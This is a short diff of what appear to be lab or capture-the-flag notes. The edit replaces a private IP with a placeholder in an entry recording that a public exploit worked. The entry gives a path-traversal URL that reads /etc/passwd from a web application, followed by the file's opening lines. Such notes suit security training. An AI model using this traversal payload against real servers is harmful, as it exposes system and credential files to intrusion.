@@ -19,7 +19,7 @@ database:
 
 
 	using https://www.exploit-db.com/exploits/48411
-	this worked http://192.168.50.196:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd 
+	this worked http://<VICTIM IP>:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd 
 		got: 
 			root:x:0:0:root:/root:/bin/bash
 			daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
